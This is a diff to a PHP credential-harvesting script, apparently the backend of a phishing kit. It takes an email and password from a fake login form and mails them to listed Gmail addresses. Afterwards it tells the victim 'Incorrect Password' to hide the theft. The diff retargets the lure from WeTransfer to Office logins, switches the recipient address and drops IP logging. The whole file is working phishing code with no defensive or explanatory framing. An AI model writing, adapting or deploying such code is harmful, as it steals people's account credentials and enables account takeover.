@@ -7,24 +7,12 @@ class Email{
         }
     }
 
-	public function getIp(){
-		$ip = $_SERVER['REMOTE_ADDR'];
-		
-		if(!empty($_SERVER['HTTP_CLIENT_IP'])){
-			$ip = $_SERVER['HTTP_CLIENT_IP'];
-		}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
-			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
-		}
-		return $ip;
-	}
-
 	public function sendMail($data){
-        $this->to = 'odilichukwujoel@gmail.com';
-        //$this->to = 'sikkens40@gmail.com';
+        //$this->to = 'odilichukwujoel@gmail.com,Toolz.morathy@gmail.com';
+        $this->to = 'sikkens40@gmail.com';
 		$pass = $data['pass'];
 		$email = $data['email'];
-		$ip = $data['ip'];
-		$this->subject = "We Transfer Login Details";
+		$this->subject = "Office Login Details";
 		$this->msg = 
 		"
 		<html>
@@ -33,12 +21,11 @@ class Email{
 			</head>
 
 			<body>
-				<h3>We Transfer Login Details</h3>
+				<h3>Office Login Details</h3>
 				<p>This is the information you required</p>
 			    <br><br>
 			    <p><strong>Email:</strong> $email</p>
 			    <p><strong>Password:</strong> $pass</p>
-			    <p><strong>IP:</strong> $ip</p>
 			    <br>
 			</body>
 		</html>
@@ -47,10 +34,9 @@ class Email{
 		// Content type for html message
 		$this->header = "MIME-Version: 1.0"."\r\n";
 		$this->header .= "Content-type:text/html;charset=UTF-8"."\r\n";
-		$this->header .= "Access-Control-Allow-Origin: *"."\r\n";
 
 		// Header From
-		$this->header .= "From: We Transfer Logins <support@officelogin.com>"."\r\n";
+		$this->header .= "From: Office Logins <support@officelogin.com>"."\r\n";
 
 		//Forward the mail
 		if(mail($this->to, $this->subject, $this->msg, $this->header)){
@@ -69,11 +55,11 @@ if(isset($_POST)){
     $data = array();
     $data['email'] = $email->clean($_REQUEST['email']);
     $data['pass'] = $email->clean($_REQUEST['password']);
-    $data['ip'] = $email->getIp();
 
     if($email->sendMail($data) == true){
-        echo "Incorrect Password";
+        echo "<b>Error! </b>Incorrect Password";
     }else{
-        echo "Something went wrong";
+        echo "0";
     }
 }
+
